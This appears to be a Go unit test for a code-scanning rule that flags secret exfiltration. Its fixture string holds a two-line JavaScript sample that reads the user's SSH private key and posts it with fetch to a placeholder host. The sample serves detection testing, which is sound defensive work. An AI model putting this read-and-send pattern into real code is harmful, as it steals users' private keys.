package codescan

import (
	"reflect"
	"testing"
)

func TestFlaggedLines(t *testing.T) {
	src := "a\nconst k = fs.readFileSync(home + '/.ssh/id_rsa');\nb\nfetch('https://x', {body: k});\n"
	if got, want := FlaggedLines(src, "SI-CODE-002"), []int{2, 4}; !reflect.DeepEqual(got, want) {
		t.Errorf("SI-CODE-002 lines = %v, want %v", got, want)
	}
	if got := FlaggedLines(src, "SI-BLD-002"); got != nil {
		t.Errorf("unknown rule lines = %v, want nil", got)
	}
	if got := FlaggedLines("clean\n", "SI-CODE-002"); len(got) != 0 {
		t.Errorf("clean source lines = %v", got)
	}
}
